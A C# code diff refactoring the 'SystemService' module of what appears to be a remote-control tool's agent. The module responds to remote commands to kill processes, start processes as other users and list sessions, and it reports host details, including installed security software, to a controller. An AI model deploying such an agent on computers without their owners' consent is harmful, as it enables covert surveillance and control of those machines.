@@ -2,10 +2,9 @@
 using SiMay.Basic;
 using SiMay.Core;
 using SiMay.ModelBinder;
+using SiMay.Net.SessionProvider;
 using SiMay.RemoteService.Loader;
 using SiMay.ServiceCore.Attributes;
-using SiMay.ServiceCore.Helper;
-using SiMay.Sockets.Tcp.Session;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -16,12 +15,12 @@ using static SiMay.Platform.Windows.CommonWin32Api;
 namespace SiMay.ServiceCore
 {
     [ServiceName("系统管理")]
-    [ServiceKey(AppJobConstant.REMOTE_SYSMANAGER)]
+    [ServiceKey(AppFlageConstant.REMOTE_SYSMANAGER)]
     public class SystemService : ApplicationRemoteService
     {
         private ComputerInfo _memoryInfo = new ComputerInfo();
         private PerformanceCounter _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-        public override void SessionInited(TcpSocketSaeaSession session)
+        public override void SessionInited(SessionProviderContext session)
         {
 
         }
@@ -32,9 +31,9 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_KILL)]
-        public void TryKillProcess(TcpSocketSaeaSession session)
+        public void TryKillProcess(SessionProviderContext session)
         {
-            var processIds = GetMessageEntity<SysKillPack>(session);
+            var processIds = session.GetMessageEntity<SysKillPack>();
             foreach (var id in processIds.ProcessIds)
             {
                 try
@@ -48,9 +47,9 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
-        public void SetWindowState(TcpSocketSaeaSession session)
+        public void SetWindowState(SessionProviderContext session)
         {
-            var pack = GetMessageEntity<SysWindowMaxPack>(session);
+            var pack = session.GetMessageEntity<SysWindowMaxPack>();
             int[] handlers = pack.Handlers;
             int state = pack.State;
 
@@ -67,25 +66,25 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
-        public void HandlerGetSystemProcessList(TcpSocketSaeaSession session)
+        public void HandlerGetSystemProcessList(SessionProviderContext session)
             => this.SendProcessList();
 
 
         [PacketHandler(MessageHead.S_SYSTEM_ENUMSESSIONS)]
-        public void GetSessionItemHandler(TcpSocketSaeaSession session)
+        public void GetSessionItemHandler(SessionProviderContext session)
             => SendSessionItem();
 
         [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
-        public void CreateProcessAsUser(TcpSocketSaeaSession session)
+        public void CreateProcessAsUser(SessionProviderContext session)
         {
-            var sessionId = GetMessageEntity<CreateProcessAsUserPack>(session).SessionId;
+            var sessionId = session.GetMessageEntity<CreateProcessAsUserPack>().SessionId;
             UserTrunkContext.UserTrunkContextInstance?.CreateProcessAsUser(sessionId);
         }
 
         private void SendSessionItem()
         {
             var sessions = UserTrunkContext.UserTrunkContextInstance?.GetSessionItems()
-                .Select(c => new  Core.SessionItem()
+                .Select(c => new Core.SessionItem()
                 {
                     UserName = c.UserName,
                     SessionId = c.SessionId,
@@ -98,7 +97,7 @@ namespace SiMay.ServiceCore
             if (sessions.IsNull())
                 return;
 
-            SendTo(CurrentSession, MessageHead.C_SYSTEM_SESSIONS,
+            CurrentSession.SendTo(MessageHead.C_SYSTEM_SESSIONS,
                         new SessionsPack()
                         {
                             Sessions = sessions
@@ -128,7 +127,7 @@ namespace SiMay.ServiceCore
             //    return p;
             //}).ToArray();
 
-            SendTo(CurrentSession, MessageHead.C_SYSTEM_PROCESS_LIST,
+            CurrentSession.SendTo(MessageHead.C_SYSTEM_PROCESS_LIST,
                 new ProcessListPack()
                 {
                     ProcessList = processList
@@ -147,7 +146,7 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
-        public void GetSystemInfosHandler(TcpSocketSaeaSession session)
+        public void GetSystemInfosHandler(SessionProviderContext session)
         {
             ThreadHelper.ThreadPoolStart(c =>
             {
@@ -157,17 +156,17 @@ namespace SiMay.ServiceCore
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "主板序列号",
-                    Value = SystemInfoHelper.BIOSSerialNumber
+                    Value = GetSystemInforHelper.BIOSSerialNumber
                 });
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "网卡MAC",
-                    Value = SystemInfoHelper.GetMacAddress
+                    Value = GetSystemInforHelper.GetMacAddress
                 });
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "驱动器存储信息",
-                    Value = SystemInfoHelper.GetMyDriveInfo
+                    Value = GetSystemInforHelper.GetMyDriveInfo
                 });
                 infos.Add(new SystemInfoItem()
                 {
@@ -197,7 +196,7 @@ namespace SiMay.ServiceCore
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "系统版本",
-                    Value = SystemInfoHelper.GetOSFullName
+                    Value = GetSystemInforHelper.GetOSFullName
                 });
                 infos.Add(new SystemInfoItem()
                 {
@@ -208,13 +207,13 @@ namespace SiMay.ServiceCore
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "CPU信息",
-                    Value = SystemInfoHelper.GetMyCpuInfo
+                    Value = GetSystemInforHelper.GetMyCpuInfo
                 });
 
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "系统内存",
-                    Value = (SystemInfoHelper.GetMyMemorySize / 1024 / 1024) + "MB"
+                    Value = (GetSystemInforHelper.GetMyMemorySize / 1024 / 1024) + "MB"
                 });
 
                 infos.Add(new SystemInfoItem()
@@ -236,12 +235,12 @@ namespace SiMay.ServiceCore
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "LAN IP",
-                    Value = SystemInfoHelper.GetLocalIPV4()
+                    Value = GetSystemInforHelper.GetLocalIPV4()
                 });
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "安全软件",
-                    Value = SystemInfoHelper.GetAntivirus()
+                    Value = GetSystemInforHelper.GetAntivirus()
                 });
                 infos.Add(new SystemInfoItem()
                 {
@@ -256,16 +255,16 @@ namespace SiMay.ServiceCore
                 infos.Add(new SystemInfoItem()
                 {
                     ItemName = "GPU",
-                    Value = SystemInfoHelper.GetGpuName()
+                    Value = GetSystemInforHelper.GetGpuName()
                 });
                 var sysInfos = new SystemInfoPack();
                 sysInfos.SystemInfos = infos.ToArray();
-                SendTo(CurrentSession, MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
+                CurrentSession.SendTo(MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
             });
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_OCCUPY)]
-        public void handlerGetSystemOccupyRate(TcpSocketSaeaSession session)
+        public void handlerGetSystemOccupyRate(SessionProviderContext session)
         {
             string cpuUserate = "-1";
             try
@@ -274,7 +273,7 @@ namespace SiMay.ServiceCore
             }
             catch { }
 
-            SendTo(CurrentSession, MessageHead.C_SYSTEM_OCCUPY_INFO,
+            CurrentSession.SendTo(MessageHead.C_SYSTEM_OCCUPY_INFO,
                 new SystemOccupyPack()
                 {
                     CpuUsage = cpuUserate,
